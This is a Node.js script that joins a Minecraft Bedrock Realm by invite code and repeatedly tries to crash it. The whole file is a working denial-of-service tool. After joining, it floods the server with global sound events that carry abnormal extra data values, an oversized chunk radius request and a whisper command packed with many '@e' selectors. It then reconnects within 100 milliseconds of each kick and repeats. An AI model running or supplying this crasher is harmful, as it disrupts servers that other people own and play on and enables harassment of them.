const protocol = require("bedrock-protocol");
const onErrorCB = [];
const onError = (callback) => onErrorCB.push(callback);

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const runCommand = (client, command) => {
    client.write('command_request', {
        command: command,
        origin: {
            type: 5,
            uuid: '',
            request_id: '',
        },
        internal: false,
        version: 66,
    });
};

const levelSoundEvent = (client, data) => {
    client.write('level_sound_event', data);
};


/**
 * @param {protocol.ClientOptions} options
 * @param {Number} s
 * @param {Number} start
 * @return {Promise<{ success: boolean, embed: discord.EmbedBuilder }>}
 */
const crash = async (options) => {
    const run = async () => {

        const client = new protocol.createClient(options);
        const disconnected = async (data = "None") => {
            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} disconnected!`, data);
            await wait(100) // waits 100ms before attempting to join/crash
            return run();
        }

        onError((e) => {
            console.error(e);
        });

        client.on("kick", async (packet) => {
            return disconnected(packet);
        });

        client.on("disconnect", async (packet) => {
            return disconnected(packet);
        });

        client.on("play_status", async (data) => {
            await wait(7);
            console.log(`${new Date(Date.now()).toLocaleTimeString()} > ${options.username} joined! Sending packets...`);
            let i = 0;
            while (i < 99) {
                const pos = data.player_position ?? {
                    x: 0,
                    y: 0,
                    z: 0,
                };
                client.write("chunk_radius_update", { // dont know if this actually does anything lol
                    chunk_radius: 500
                })
                levelSoundEvent(client, {
                    position: pos,
                    extra_data: -1,
                    sound_id: "Death",
                    entity_type: "minecraft:ender_dragon",
                    is_global: true,
                });
                levelSoundEvent(client, {
                    position: pos,
                    extra_data: 637546,
                    sound_id: "Splash",
                    entity_type: "",
                    is_global: true,
                });
                levelSoundEvent(client, {
                    sound_id: "BundleRemoveOne",
                    entity_type: "",
                    position: pos,
                    is_global: true,
                    extra_data: -1124852450,
                    is_baby_mob: false,
                });
                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}\n`);
                i++;
            }
            return disconnected();
        });
    }
    run()
};

/** @type {protocol.ClientOptions} */
const options = {
    profilesFolder: "./profiles",
    username: "MinecraftOMG",
    skipPing: true,
    conLog: console.log,
    realms: {
        realmInvite: "J9TGSEH489A"
    },
    // host: "",
    // port: 19132,
    viewDistance: 32767
};

crash(options);

process.on("uncaughtException", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});

process.on("unhandledRejection", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});
